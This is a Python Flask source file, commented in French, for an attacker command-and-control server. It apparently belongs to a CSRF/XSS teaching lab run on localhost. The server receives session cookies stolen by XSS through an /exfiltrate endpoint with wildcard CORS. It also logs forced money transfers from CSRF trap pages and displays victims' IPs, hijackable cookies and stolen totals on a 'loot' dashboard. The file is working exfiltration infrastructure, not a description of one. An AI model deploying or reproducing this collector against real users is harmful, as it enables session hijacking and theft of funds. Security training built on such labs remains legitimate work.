# ==============================================================================
# SERVEUR C2 ATTAQUANT UNIFIÉ - DASHBOARD DES BUTINS & COOKIES (PORT 8082)
# Centralise :
# 1. Les virements d'argent forcés (CSRF Scénario 1, CSRF Scénario 2, Combo CSRF+XSS)
# 2. Les cookies de session volés en direct (XSS Stored / Reflected)
# ==============================================================================

import datetime
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# Base en mémoire pour les butins de l'attaquant
LOOT_DATA = {
    "total_stolen": 0.0,
    "transactions": [],
    "stolen_cookies": []
}

HTML_DASHBOARD = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>C2 Command & Control - Dashboard Attaquant Unifié</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #090d16;
            color: #e2e8f0;
            padding: 25px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #1e293b;
            padding-bottom: 20px;
            margin-bottom: 25px;
        }
        .title-c2 {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .pulse-c2 {
            width: 14px;
            height: 14px;
            background: #ef4444;
            border-radius: 50%;
            box-shadow: 0 0 12px #ef4444;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0.8; }
            50% { transform: scale(1.2); opacity: 1; }
            100% { transform: scale(0.95); opacity: 0.8; }
        }
        h1 { font-size: 24px; color: #f8fafc; }
        .subtitle { font-size: 13px; color: #94a3b8; margin-top: 4px; }

        /* Stats Cards */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        .card {
            background: #111827;
            border: 1px solid #1f2937;
            padding: 20px;
            border-radius: 12px;
            position: relative;
            overflow: hidden;
        }
        .card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 4px; height: 100%;
        }
        .card-green::before { background: #10b981; }
        .card-blue::before { background: #3b82f6; }
        .card-purple::before { background: #a855f7; }
        .card-red::before { background: #ef4444; }

        .card-title { font-size: 11px; text-transform: uppercase; color: #9ca3af; letter-spacing: 0.5px; }
        .card-value { font-size: 26px; font-weight: bold; margin-top: 8px; }
        .card-green .card-value { color: #10b981; }
        .card-blue .card-value { color: #60a5fa; }
        .card-purple .card-value { color: #c084fc; }
        .card-red .card-value { color: #f87171; }

        /* Actions bar */
        .actions-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 25px;
            margin-bottom: 12px;
        }
        .btn {
            background: #1f2937;
            color: #cbd5e1;
            border: 1px solid #374151;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            transition: all 0.2s;
        }
        .btn:hover { background: #374151; color: white; }
        .btn-reset { border-color: #7f1d1d; color: #fca5a5; }
        .btn-reset:hover { background: #991b1b; color: white; }

        /* Table */
        .table-container {
            background: #111827;
            border: 1px solid #1f2937;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
            font-size: 13.5px;
        }
        th {
            background: #1a2234;
            color: #94a3b8;
            padding: 12px 16px;
            font-weight: 600;
            border-bottom: 1px solid #1f2937;
        }
        td {
            padding: 12px 16px;
            border-bottom: 1px solid #1b2434;
            color: #e2e8f0;
        }
        tr:hover { background: rgba(255,255,255,0.02); }

        /* Badges */
        .badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
        }
        .badge-csrf1 { background: #1e3a8a; color: #93c5fd; }
        .badge-csrf2 { background: #581c87; color: #d8b4fe; }
        .badge-combo { background: #831843; color: #fbcfe8; }
        .badge-xss   { background: #3b0764; color: #f0abfc; border: 1px solid #c084fc; }
        
        .badge-ip {
            background: #0f291e;
            color: #34d399;
            font-family: monospace;
            padding: 4px 8px;
            border-radius: 4px;
            border: 1px solid #065f46;
        }

        .cookie-code {
            background: #020617;
            color: #38bdf8;
            padding: 4px 8px;
            border-radius: 4px;
            font-family: Consolas, monospace;
            font-size: 12px;
            word-break: break-all;
            border: 1px solid #1e293b;
        }

        .montant-stolen {
            color: #10b981;
            font-weight: bold;
            font-size: 15px;
        }

        .empty-state {
            text-align: center;
            padding: 35px 20px;
            color: #64748b;
        }
        
        .footer-shortcuts {
            margin-top: 25px;
            padding: 15px 20px;
            background: #111827;
            border: 1px dashed #334155;
            border-radius: 8px;
            font-size: 13px;
            color: #94a3b8;
        }
        .footer-shortcuts a {
            color: #38bdf8;
            text-decoration: none;
            margin-right: 15px;
        }
        .footer-shortcuts a:hover { text-decoration: underline; }
    </style>
</head>
<body>

    <div class="header">
        <div class="title-c2">
            <div class="pulse-c2"></div>
            <div>
                <h1>CONSOLE C2 - GESTIONNAIRE DE BUTINS & EXFILTRATIONS</h1>
                <div class="subtitle">Écouteur unifié sur le port 8082 • Surveillance temps réel (CSRF, XSS & Combo)</div>
            </div>
        </div>
        <div>
            <button class="btn" onclick="fetchLoot()">🔄 Actualiser</button>
            <button class="btn btn-reset" onclick="resetLoot()">🗑️ Réinitialiser Butins</button>
        </div>
    </div>

    <!-- STATS -->
    <div class="stats-grid">
        <div class="card card-green">
            <div class="card-title">Cagnotte Totale Volée</div>
            <div class="card-value" id="valTotal">0.00 €</div>
        </div>
        <div class="card card-blue">
            <div class="card-title">Virements Forcés Reçus</div>
            <div class="card-value" id="valCount">0</div>
        </div>
        <div class="card card-purple">
            <div class="card-title">Cookies de Session Volés (XSS)</div>
            <div class="card-value" id="valCookies">0</div>
        </div>
        <div class="card card-red">
            <div class="card-title">Dernière Victime Détectée</div>
            <div class="card-value" style="font-size: 18px; margin-top: 10px;" id="valLastIp">Aucune</div>
        </div>
    </div>

    <!-- TABLEAU 1 : VIREMENTS FORCÉS (CSRF & COMBO) -->
    <div class="actions-bar">
        <h2 style="font-size: 16px; color: #f1f5f9;">💰 Historique des Virements Forcés (CSRF & Combo)</h2>
        <span style="font-size: 12px; color: #10b981;">● Auto-refresh (2s)</span>
    </div>

    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>Horodatage</th>
                    <th>Adresse IP Victime</th>
                    <th>Dossier / Scénario</th>
                    <th>Vecteur Technique</th>
                    <th>Victime (Compte)</th>
                    <th>Montant Dérobé</th>
                    <th>Statut</th>
                </tr>
            </thead>
            <tbody id="lootTableBody">
                <tr>
                    <td colspan="7" class="empty-state">
                        En attente d'une transaction... Déclenchez une attaque pour voir le virement s'afficher ici !
                    </td>
                </tr>
            </tbody>
        </table>
    </div>

    <!-- TABLEAU 2 : COOKIES EXFILTRÉS PAR XSS -->
    <div class="actions-bar">
        <h2 style="font-size: 16px; color: #c084fc;">🍪 Cookies & Sessions Exfiltrés en Direct (xss-tp)</h2>
        <span style="font-size: 12px; color: #c084fc;">● Écouteur XSS Actif</span>
    </div>

    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th style="width: 120px;">Horodatage</th>
                    <th style="width: 160px;">Adresse IP Victime</th>
                    <th style="width: 140px;">Attaque</th>
                    <th>Cookie de Session Volé (document.cookie)</th>
                    <th style="width: 120px;">Exploitation</th>
                </tr>
            </thead>
            <tbody id="cookieTableBody">
                <tr>
                    <td colspan="5" class="empty-state">
                        Aucun cookie volé pour le moment. Injectez le payload XSS dans le livre d'or de xss-tp pour le capturer !
                    </td>
                </tr>
            </tbody>
        </table>
    </div>

    <!-- LIENS RAPIDES -->
    <div class="footer-shortcuts">
        <strong>🔗 Liens Rapides Démo :</strong>
        <a href="http://127.0.0.1:8081/stage_recrutement.html" target="_blank">Piège Scénario 1 (GET Recrutement)</a>
        <a href="http://127.0.0.1:8081/forum_photo.html" target="_blank">Piège Scénario 2 (Photo <img>)</a>
        <a href="http://127.0.0.1:8081/1_csrf_fail.html" target="_blank">Piège Combo (Échec 403 CSRF)</a>
        <a href="http://127.0.0.1:5000" target="_blank">Application Cible (Port 5000)</a>
    </div>

    <script>
        function getBadgeClass(scenario) {
            if (scenario.includes('Scénario 1')) return 'badge-csrf1';
            if (scenario.includes('Scénario 2')) return 'badge-csrf2';
            return 'badge-combo';
        }

        function renderData(data) {
            document.getElementById('valTotal').innerText = data.total_stolen.toFixed(2) + " €";
            document.getElementById('valCount').innerText = data.transactions.length;
            document.getElementById('valCookies').innerText = (data.stolen_cookies || []).length;

            // 1. Transactions
            const tbodyLoot = document.getElementById('lootTableBody');
            if (!data.transactions || data.transactions.length === 0) {
                tbodyLoot.innerHTML = `<tr><td colspan="7" class="empty-state">En attente d'une transaction... Déclenchez un scénario pour voir le résultat ici !</td></tr>`;
                document.getElementById('valLastIp').innerText = "Aucune";
            } else {
                document.getElementById('valLastIp').innerText = data.transactions[0].ip;
                let html = '';
                data.transactions.forEach(t => {
                    html += `
                        <tr>
                            <td style="color:#94a3b8; font-family: monospace;">${t.timestamp}</td>
                            <td><span class="badge-ip">${t.ip}</span></td>
                            <td><span class="badge ${getBadgeClass(t.scenario)}">${t.scenario}</span></td>
                            <td style="color:#cbd5e1;">${t.vector}</td>
                            <td><strong>${t.victim}</strong></td>
                            <td class="montant-stolen">+ ${t.amount.toFixed(2)} €</td>
                            <td><span style="color:#10b981; font-weight: bold;">✔ Confirmé</span></td>
                        </tr>
                    `;
                });
                tbodyLoot.innerHTML = html;
            }

            // 2. Cookies volés
            const tbodyCookie = document.getElementById('cookieTableBody');
            if (!data.stolen_cookies || data.stolen_cookies.length === 0) {
                tbodyCookie.innerHTML = `<tr><td colspan="5" class="empty-state">Aucun cookie volé pour le moment. Injectez le payload XSS dans le livre d'or de xss-tp pour le capturer !</td></tr>`;
            } else {
                let htmlC = '';
                data.stolen_cookies.forEach(c => {
                    htmlC += `
                        <tr>
                            <td style="color:#94a3b8; font-family: monospace;">${c.timestamp}</td>
                            <td><span class="badge-ip">${c.ip}</span></td>
                            <td><span class="badge badge-xss">XSS Stocké</span></td>
                            <td><code class="cookie-code">${c.cookie}</code></td>
                            <td><span style="color:#c084fc; font-weight: bold;">🔑 Session Usurpable</span></td>
                        </tr>
                    `;
                });
                tbodyCookie.innerHTML = htmlC;
            }
        }

        function fetchLoot() {
            fetch('/api/loot')
                .then(res => res.json())
                .then(data => renderData(data))
                .catch(err => console.error("Erreur sync C2:", err));
        }

        function resetLoot() {
            if (confirm("Réinitialiser l'historique des butins et des cookies ?")) {
                fetch('/api/reset', { method: 'POST' })
                    .then(res => res.json())
                    .then(data => renderData(data));
            }
        }

        setInterval(fetchLoot, 2000);
        fetchLoot();
    </script>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(HTML_DASHBOARD)

@app.route('/api/loot', methods=['GET'])
def get_loot():
    return jsonify(LOOT_DATA)

@app.route('/api/notify-loot', methods=['POST', 'GET'])
def notify_loot():
    """
    Reçoit les notifications d'argent dérobé (CSRF / Combo).
    """
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if victim_ip == '::1':
        victim_ip = '127.0.0.1'

    if request.is_json:
        data = request.get_json()
    else:
        data = request.values

    amount = float(data.get('amount', data.get('montant', 0)))
    scenario = data.get('scenario', 'CSRF Inconnu')
    vector = data.get('vector', 'HTTP Request')
    victim = data.get('victim', 'user')
    custom_ip = data.get('ip')
    if custom_ip:
        victim_ip = custom_ip

    timestamp = datetime.datetime.now().strftime("%H:%M:%S")

    LOOT_DATA["total_stolen"] += amount
    LOOT_DATA["transactions"].insert(0, {
        "timestamp": timestamp,
        "ip": victim_ip,
        "scenario": scenario,
        "vector": vector,
        "victim": victim,
        "amount": amount
    })

    print(f"[C2 NOTIFY] +{amount} € encaissés depuis {victim_ip} ({scenario})")
    return jsonify({"status": "success", "total_stolen": LOOT_DATA["total_stolen"]})

# ==============================================================================
# ROUTE D'EXFILTRATION DIRECTE XSS (REMPLACE ET UNIFIE LE PORT 8888 !)
# ==============================================================================
@app.route('/exfiltrate', methods=['GET'])
def exfiltrate_cookie():
    cookie = request.args.get('cookie', 'Cookie vide ou HttpOnly')
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if victim_ip == '::1':
        victim_ip = '127.0.0.1'

    timestamp = datetime.datetime.now().strftime("%H:%M:%S")

    LOOT_DATA["stolen_cookies"].insert(0, {
        "timestamp": timestamp,
        "ip": victim_ip,
        "cookie": cookie
    })

    print(f"[C2 XSS] Cookie capturé depuis {victim_ip} : {cookie}")

    # Réponse avec en-têtes CORS pour autoriser l'exfiltration cross-origin
    response = jsonify({"status": "cookie_received"})
    response.headers.add("Access-Control-Allow-Origin", "*")
    return response

@app.route('/api/reset', methods=['POST'])
def reset_loot():
    LOOT_DATA["total_stolen"] = 0.0
    LOOT_DATA["transactions"] = []
    LOOT_DATA["stolen_cookies"] = []
    return jsonify(LOOT_DATA)

if __name__ == '__main__':
    print("[*] Serveur C2 Attaquant démarré sur http://0.0.0.0:8082")
    app.run(host='0.0.0.0', port=8082, debug=False)
